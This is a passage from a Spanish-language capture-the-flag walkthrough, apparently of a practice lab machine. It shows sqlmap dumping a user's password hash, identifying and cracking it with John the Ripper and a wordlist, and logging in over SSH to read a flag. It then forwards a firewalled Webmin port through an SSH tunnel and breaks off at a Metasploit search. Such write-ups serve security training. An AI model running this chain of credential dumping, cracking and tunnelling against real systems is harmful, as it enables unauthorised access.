</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#ae81ff">13</span><span style="color:#f92672">:</span><span style="color:#ae81ff">41</span>] [<span style="color:#a6e22e">INFO</span>] <span style="color:#a6e22e">recognized</span> <span style="color:#a6e22e">possible</span> <span style="color:#a6e22e">password</span> <span style="color:#a6e22e">hashes</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">column</span> <span style="color:#e6db74">&#39;pwd&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span> <span style="color:#a6e22e">you</span> <span style="color:#a6e22e">want</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">store</span> <span style="color:#a6e22e">hashes</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">a</span> <span style="color:#a6e22e">temporary</span> <span style="color:#a6e22e">file</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">eventual</span> <span style="color:#a6e22e">further</span> <span style="color:#a6e22e">processing</span> <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">other</span> <span style="color:#a6e22e">tools</span> [<span style="color:#a6e22e">y</span><span style="color:#f92672">/</span><span style="color:#a6e22e">N</span>] <span style="color:#a6e22e">y</span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#ae81ff">13</span><span style="color:#f92672">:</span><span style="color:#ae81ff">47</span>] [<span style="color:#a6e22e">INFO</span>] <span style="color:#a6e22e">writing</span> <span style="color:#a6e22e">hashes</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">a</span> <span style="color:#a6e22e">temporary</span> <span style="color:#a6e22e">file</span> <span style="color:#e6db74">&#39;/tmp/sqlmapt61grbs538569/sqlmaphashes-dwlpsyxn.txt&#39;</span> 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span> <span style="color:#a6e22e">you</span> <span style="color:#a6e22e">want</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">crack</span> <span style="color:#a6e22e">them</span> <span style="color:#a6e22e">via</span> <span style="color:#a6e22e">a</span> <span style="color:#a6e22e">dictionary</span><span style="color:#f92672">-</span><span style="color:#a6e22e">based</span> <span style="color:#a6e22e">attack</span><span style="color:#f92672">?</span> [<span style="color:#a6e22e">Y</span><span style="color:#f92672">/</span><span style="color:#a6e22e">n</span><span style="color:#f92672">/</span><span style="color:#a6e22e">q</span>] <span style="color:#a6e22e">y</span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#ae81ff">13</span><span style="color:#f92672">:</span><span style="color:#ae81ff">54</span>] [<span style="color:#a6e22e">INFO</span>] <span style="color:#a6e22e">using</span> <span style="color:#a6e22e">hash</span> <span style="color:#a6e22e">method</span> <span style="color:#e6db74">&#39;sha256_generic_passwd&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">what</span> <span style="color:#a6e22e">dictionary</span> <span style="color:#66d9ef">do</span> <span style="color:#a6e22e">you</span> <span style="color:#a6e22e">want</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">use</span><span style="color:#f92672">?</span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">1</span>] <span style="color:#66d9ef">default</span> <span style="color:#a6e22e">dictionary</span> <span style="color:#a6e22e">file</span> <span style="color:#e6db74">&#39;/usr/share/sqlmap/data/txt/wordlist.tx_&#39;</span> (<span style="color:#a6e22e">press</span> <span style="color:#a6e22e">Enter</span>)
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">2</span>] <span style="color:#a6e22e">custom</span> <span style="color:#a6e22e">dictionary</span> <span style="color:#a6e22e">file</span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">3</span>] <span style="color:#a6e22e">file</span> <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">list</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">dictionary</span> <span style="color:#a6e22e">files</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;</span> <span style="color:#960050;background-color:#1e0010">/usr/share/wordlists/rockyou.txt</span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#ae81ff">14</span><span style="color:#f92672">:</span><span style="color:#ae81ff">14</span>] [<span style="color:#a6e22e">INFO</span>] <span style="color:#a6e22e">using</span> <span style="color:#66d9ef">default</span> <span style="color:#a6e22e">dictionary</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span> <span style="color:#a6e22e">you</span> <span style="color:#a6e22e">want</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">use</span> <span style="color:#a6e22e">common</span> <span style="color:#a6e22e">password</span> <span style="color:#a6e22e">suffixes</span><span style="color:#f92672">?</span> (<span style="color:#a6e22e">slow</span><span style="color:#f92672">!</span>) [<span style="color:#a6e22e">y</span><span style="color:#f92672">/</span><span style="color:#a6e22e">N</span>] <span style="color:#a6e22e">n</span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#ae81ff">14</span><span style="color:#f92672">:</span><span style="color:#ae81ff">18</span>] [<span style="color:#a6e22e">INFO</span>] <span style="color:#a6e22e">starting</span> <span style="color:#a6e22e">dictionary</span><span style="color:#f92672">-</span><span style="color:#a6e22e">based</span> <span style="color:#a6e22e">cracking</span> (<span style="color:#a6e22e">sha256_generic_passwd</span>)
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#ae81ff">14</span><span style="color:#f92672">:</span><span style="color:#ae81ff">18</span>] [<span style="color:#a6e22e">INFO</span>] <span style="color:#a6e22e">starting</span> <span style="color:#ae81ff">24</span> <span style="color:#a6e22e">processes</span> 
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#ae81ff">14</span><span style="color:#f92672">:</span><span style="color:#ae81ff">20</span>] [<span style="color:#a6e22e">WARNING</span>] <span style="color:#a6e22e">no</span> <span style="color:#a6e22e">clear</span> <span style="color:#a6e22e">password</span>(<span style="color:#a6e22e">s</span>) <span style="color:#a6e22e">found</span>                                                                                                                                              
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Database</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">db</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Table</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">users</span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">1</span> <span style="color:#a6e22e">entry</span>]
</span></span><span style="display:flex;"><span><span style="color:#f92672">+------------------------------------------------------------------+----------+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#a6e22e">pwd</span>                                                              <span style="color:#f92672">|</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+------------------------------------------------------------------+----------+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#a6e22e">ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">agent47</span>  <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+------------------------------------------------------------------+----------+</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#ae81ff">14</span><span style="color:#f92672">:</span><span style="color:#ae81ff">20</span>] [<span style="color:#a6e22e">INFO</span>] <span style="color:#a6e22e">table</span> <span style="color:#e6db74">&#39;db.users&#39;</span> <span style="color:#a6e22e">dumped</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">CSV</span> <span style="color:#a6e22e">file</span> <span style="color:#e6db74">&#39;/home/k3ss/.local/share/sqlmap/output/10.10.62.97/dump/db/users.csv&#39;</span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#ae81ff">14</span><span style="color:#f92672">:</span><span style="color:#ae81ff">20</span>] [<span style="color:#a6e22e">INFO</span>] <span style="color:#a6e22e">fetched</span> <span style="color:#a6e22e">data</span> <span style="color:#a6e22e">logged</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">text</span> <span style="color:#a6e22e">files</span> <span style="color:#a6e22e">under</span> <span style="color:#e6db74">&#39;/home/k3ss/.local/share/sqlmap/output/10.10.62.97&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] <span style="color:#a6e22e">ending</span> <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#ae81ff">14</span><span style="color:#f92672">:</span><span style="color:#ae81ff">20</span> <span style="color:#f92672">/</span><span style="color:#ae81ff">2023</span><span style="color:#f92672">-</span><span style="color:#ae81ff">09</span><span style="color:#f92672">-</span><span style="color:#ae81ff">01</span><span style="color:#f92672">/</span>
</span></span></code></pre></div><h2 id="task-4---cracking-the-hash">Task 4 - Cracking the hash</h2>
<h3 id="paso-5">Paso 5</h3>
<ul>
<li>Uso hashid para identeficar el tipo de hash. Parece probable que sea SHA-256</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">hashid</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Analyzing</span> <span style="color:#e6db74">&#39;ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14&#39;</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] <span style="color:#a6e22e">Snefru</span><span style="color:#f92672">-</span><span style="color:#ae81ff">256</span> 
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] <span style="color:#a6e22e">SHA</span><span style="color:#f92672">-</span><span style="color:#ae81ff">256</span> 
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] <span style="color:#a6e22e">RIPEMD</span><span style="color:#f92672">-</span><span style="color:#ae81ff">256</span> 
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] <span style="color:#a6e22e">Haval</span><span style="color:#f92672">-</span><span style="color:#ae81ff">256</span> 
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] <span style="color:#a6e22e">GOST</span> <span style="color:#a6e22e">R</span> <span style="color:#ae81ff">34.11</span><span style="color:#f92672">-</span><span style="color:#ae81ff">94</span> 
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] <span style="color:#a6e22e">GOST</span> <span style="color:#a6e22e">CryptoPro</span> <span style="color:#a6e22e">S</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Box</span> 
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] <span style="color:#a6e22e">SHA3</span><span style="color:#f92672">-</span><span style="color:#ae81ff">256</span> 
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] <span style="color:#a6e22e">Skein</span><span style="color:#f92672">-</span><span style="color:#ae81ff">256</span> 
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] <span style="color:#a6e22e">Skein</span><span style="color:#f92672">-</span><span style="color:#ae81ff">512</span>(<span style="color:#ae81ff">256</span>)
</span></span></code></pre></div><ul>
<li>Ataco el hash con john the ripper</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">❯</span> <span style="color:#a6e22e">john</span> <span style="color:#a6e22e">hash</span>.<span style="color:#a6e22e">txt</span> <span style="color:#f92672">--</span><span style="color:#a6e22e">wordlist</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">/usr/share/wordlists/rockyou.txt --format=Raw-SHA256</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Using</span> <span style="color:#66d9ef">default</span> <span style="color:#a6e22e">input</span> <span style="color:#a6e22e">encoding</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">UTF</span><span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Loaded</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">password</span> <span style="color:#a6e22e">hash</span> (<span style="color:#a6e22e">Raw</span><span style="color:#f92672">-</span><span style="color:#a6e22e">SHA256</span> [<span style="color:#a6e22e">SHA256</span> <span style="color:#ae81ff">256</span><span style="color:#f92672">/</span><span style="color:#ae81ff">256</span> <span style="color:#a6e22e">AVX2</span> <span style="color:#ae81ff">8</span><span style="color:#a6e22e">x</span>])
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Warning</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">poor</span> <span style="color:#a6e22e">OpenMP</span> <span style="color:#a6e22e">scalability</span> <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">this</span> <span style="color:#a6e22e">hash</span> <span style="color:#a6e22e">type</span>, <span style="color:#a6e22e">consider</span> <span style="color:#f92672">--</span><span style="color:#a6e22e">fork</span><span style="color:#f92672">=</span><span style="color:#ae81ff">24</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Will</span> <span style="color:#a6e22e">run</span> <span style="color:#ae81ff">24</span> <span style="color:#a6e22e">OpenMP</span> <span style="color:#a6e22e">threads</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Press</span> <span style="color:#e6db74">&#39;q&#39;</span> <span style="color:#a6e22e">or</span> <span style="color:#a6e22e">Ctrl</span><span style="color:#f92672">-</span><span style="color:#a6e22e">C</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">abort</span>, <span style="color:#a6e22e">almost</span> <span style="color:#a6e22e">any</span> <span style="color:#a6e22e">other</span> <span style="color:#a6e22e">key</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">status</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">videogamer124</span>    (<span style="color:#f92672">?</span>)     
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#a6e22e">g</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span> <span style="color:#a6e22e">DONE</span> (<span style="color:#ae81ff">2023</span><span style="color:#f92672">-</span><span style="color:#ae81ff">09</span><span style="color:#f92672">-</span><span style="color:#ae81ff">01</span> <span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#ae81ff">20</span>) <span style="color:#ae81ff">6.666</span><span style="color:#a6e22e">g</span><span style="color:#f92672">/</span><span style="color:#a6e22e">s</span> <span style="color:#ae81ff">20971</span><span style="color:#a6e22e">Kp</span><span style="color:#f92672">/</span><span style="color:#a6e22e">s</span> <span style="color:#ae81ff">20971</span><span style="color:#a6e22e">Kc</span><span style="color:#f92672">/</span><span style="color:#a6e22e">s</span> <span style="color:#ae81ff">20971</span><span style="color:#a6e22e">KC</span><span style="color:#f92672">/</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">wildboy23</span>..<span style="color:#a6e22e">tom</span><span style="color:#f92672">=</span><span style="color:#a6e22e">tom</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Use</span> <span style="color:#a6e22e">the</span> <span style="color:#e6db74">&#34;--show --format=Raw-SHA256&#34;</span> <span style="color:#a6e22e">options</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">display</span> <span style="color:#a6e22e">all</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">cracked</span> <span style="color:#a6e22e">passwords</span> <span style="color:#a6e22e">reliably</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Session</span> <span style="color:#a6e22e">completed</span>.
</span></span></code></pre></div><h3 id="paso-6">Paso 6</h3>
<ul>
<li>Accedo por SSH con las credenciales y obtengo la bandera</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">❯</span> <span style="color:#a6e22e">ssh</span> <span style="color:#a6e22e">agent47</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#ae81ff">10.10.62.97</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">The</span> <span style="color:#a6e22e">authenticity</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">host</span> <span style="color:#e6db74">&#39;10.10.62.97 (10.10.62.97)&#39;</span> <span style="color:#a6e22e">can</span><span style="color:#e6db74">&#39;t be established.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ED25519 key fingerprint is SHA256:CyJgMM67uFKDbNbKyUM0DexcI+LWun63SGLfBvqQcLA.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">This key is not known by any other names.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: Permanently added &#39;</span><span style="color:#ae81ff">10.10.62.97</span><span style="color:#e6db74">&#39; (ED25519) to the list of known hosts.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">agent47@10.10.62.97&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">password</span><span style="color:#f92672">:</span> 
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Welcome</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">Ubuntu</span> <span style="color:#ae81ff">16.04.6</span> <span style="color:#a6e22e">LTS</span> (<span style="color:#a6e22e">GNU</span><span style="color:#f92672">/</span><span style="color:#a6e22e">Linux</span> <span style="color:#ae81ff">4.4.0</span><span style="color:#f92672">-</span><span style="color:#ae81ff">159</span><span style="color:#f92672">-</span><span style="color:#a6e22e">generic</span> <span style="color:#a6e22e">x86_64</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">Documentation</span><span style="color:#f92672">:</span>  <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//help.ubuntu.com
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">Management</span><span style="color:#f92672">:</span>     <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//landscape.canonical.com
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">Support</span><span style="color:#f92672">:</span>        <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//ubuntu.com/advantage
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">109</span> <span style="color:#a6e22e">packages</span> <span style="color:#a6e22e">can</span> <span style="color:#a6e22e">be</span> <span style="color:#a6e22e">updated</span>.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">68</span> <span style="color:#a6e22e">updates</span> <span style="color:#a6e22e">are</span> <span style="color:#a6e22e">security</span> <span style="color:#a6e22e">updates</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Last</span> <span style="color:#a6e22e">login</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Fri</span> <span style="color:#a6e22e">Aug</span> <span style="color:#ae81ff">16</span> <span style="color:#ae81ff">17</span><span style="color:#f92672">:</span><span style="color:#ae81ff">52</span><span style="color:#f92672">:</span><span style="color:#ae81ff">04</span> <span style="color:#ae81ff">2019</span> <span style="color:#a6e22e">from</span> <span style="color:#ae81ff">192.168.1.147</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">agent47</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">gamezone</span><span style="color:#f92672">:~</span><span style="color:#a6e22e">$</span> <span style="color:#a6e22e">whoami</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">agent47</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">agent47</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">gamezone</span><span style="color:#f92672">:~</span><span style="color:#a6e22e">$</span> <span style="color:#a6e22e">cat</span> 
</span></span><span style="display:flex;"><span>.<span style="color:#a6e22e">bash_history</span>  .<span style="color:#a6e22e">bash_logout</span>   .<span style="color:#a6e22e">bashrc</span>        .<span style="color:#a6e22e">cache</span><span style="color:#f92672">/</span>        .<span style="color:#a6e22e">profile</span>       <span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">txt</span>       
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">agent47</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">gamezone</span><span style="color:#f92672">:~</span><span style="color:#a6e22e">$</span> <span style="color:#a6e22e">cat</span> <span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">txt</span> 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">649</span><span style="color:#a6e22e">ac17b1480ac13ef1e4fa579dac95c</span>
</span></span></code></pre></div><h2 id="task-5---exposing-services-with-reverse-ssh-tunnels">Task 5 - Exposing services with reverse SSH tunnels</h2>
<h3 id="paso-7">Paso 7</h3>
<ul>
<li>Reviso los sockets en la maquina objetivo</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">agent47</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">gamezone</span><span style="color:#f92672">:~</span><span style="color:#a6e22e">$</span> <span style="color:#a6e22e">ss</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">tulpn</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Netid</span>  <span style="color:#a6e22e">State</span>      <span style="color:#a6e22e">Recv</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Q</span> <span style="color:#a6e22e">Send</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Q</span>                                               <span style="color:#a6e22e">Local</span> <span style="color:#a6e22e">Address</span><span style="color:#f92672">:</span><span style="color:#a6e22e">Port</span>                                                              <span style="color:#a6e22e">Peer</span> <span style="color:#a6e22e">Address</span><span style="color:#f92672">:</span><span style="color:#a6e22e">Port</span>              
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">udp</span>    <span style="color:#a6e22e">UNCONN</span>     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>                                                                <span style="color:#f92672">*:</span><span style="color:#ae81ff">10000</span>                                                                        <span style="color:#f92672">*:*</span>                  
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">udp</span>    <span style="color:#a6e22e">UNCONN</span>     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>                                                                <span style="color:#f92672">*:</span><span style="color:#ae81ff">68</span>                                                                           <span style="color:#f92672">*:*</span>                  
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">tcp</span>    <span style="color:#a6e22e">LISTEN</span>     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">80</span>                                                       <span style="color:#ae81ff">127.0.0.1</span><span style="color:#f92672">:</span><span style="color:#ae81ff">3306</span>                                                                         <span style="color:#f92672">*:*</span>                  
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">tcp</span>    <span style="color:#a6e22e">LISTEN</span>     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">128</span>                                                              <span style="color:#f92672">*:</span><span style="color:#ae81ff">10000</span>                                                                        <span style="color:#f92672">*:*</span>                  
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">tcp</span>    <span style="color:#a6e22e">LISTEN</span>     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">128</span>                                                              <span style="color:#f92672">*:</span><span style="color:#ae81ff">22</span>                                                                           <span style="color:#f92672">*:*</span>                  
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">tcp</span>    <span style="color:#a6e22e">LISTEN</span>     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">128</span>                                                             <span style="color:#f92672">:::</span><span style="color:#ae81ff">80</span>                                                                          <span style="color:#f92672">:::*</span>                  
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">tcp</span>    <span style="color:#a6e22e">LISTEN</span>     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">128</span>                                                             <span style="color:#f92672">:::</span><span style="color:#ae81ff">22</span>                                                                          <span style="color:#f92672">:::*</span>
</span></span></code></pre></div><ul>
<li>El puerto 10000 está siendo bloqueado por un firewall, lo expongo con un tunel SSH entre la maquina y mi equipo local.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">❯</span> <span style="color:#a6e22e">ssh</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">L</span> <span style="color:#ae81ff">10000</span><span style="color:#f92672">:</span><span style="color:#a6e22e">localhost</span><span style="color:#f92672">:</span><span style="color:#ae81ff">10000</span> <span style="color:#a6e22e">agent47</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#ae81ff">10.10.62.97</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">agent47</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#ae81ff">10.10.62.97</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">password</span><span style="color:#f92672">:</span> 
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Welcome</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">Ubuntu</span> <span style="color:#ae81ff">16.04.6</span> <span style="color:#a6e22e">LTS</span> (<span style="color:#a6e22e">GNU</span><span style="color:#f92672">/</span><span style="color:#a6e22e">Linux</span> <span style="color:#ae81ff">4.4.0</span><span style="color:#f92672">-</span><span style="color:#ae81ff">159</span><span style="color:#f92672">-</span><span style="color:#a6e22e">generic</span> <span style="color:#a6e22e">x86_64</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">Documentation</span><span style="color:#f92672">:</span>  <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//help.ubuntu.com
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">Management</span><span style="color:#f92672">:</span>     <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//landscape.canonical.com
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">Support</span><span style="color:#f92672">:</span>        <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//ubuntu.com/advantage
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">109</span> <span style="color:#a6e22e">packages</span> <span style="color:#a6e22e">can</span> <span style="color:#a6e22e">be</span> <span style="color:#a6e22e">updated</span>.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">68</span> <span style="color:#a6e22e">updates</span> <span style="color:#a6e22e">are</span> <span style="color:#a6e22e">security</span> <span style="color:#a6e22e">updates</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Last</span> <span style="color:#a6e22e">login</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Fri</span> <span style="color:#a6e22e">Sep</span>  <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">09</span><span style="color:#f92672">:</span><span style="color:#ae81ff">21</span><span style="color:#f92672">:</span><span style="color:#ae81ff">58</span> <span style="color:#ae81ff">2023</span> <span style="color:#a6e22e">from</span> <span style="color:#ae81ff">10.14.50.184</span>
</span></span></code></pre></div><ul>
<li>Desde mi equipo, accedo a la url <strong>http://localhost:10000/</strong></li>
<li>Esta corriendo Webmin en ese socket, accedo con las credenciales de agent47 y veo que es la version 1.580</li>
</ul>
<h2 id="task-6---privilege-escalation-with-metasploit">Task 6 - Privilege Escalation with Metasploit</h2>
<h3 id="paso-7-1">Paso 7</h3>
<ul>
<li>Busco en metasploit y configuro el exploit para usarlo.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">msf6</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">search</span> <span style="color:#a6e22e">webmin</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Matching</span> <span style="color:#a6e22e">Modules</span>
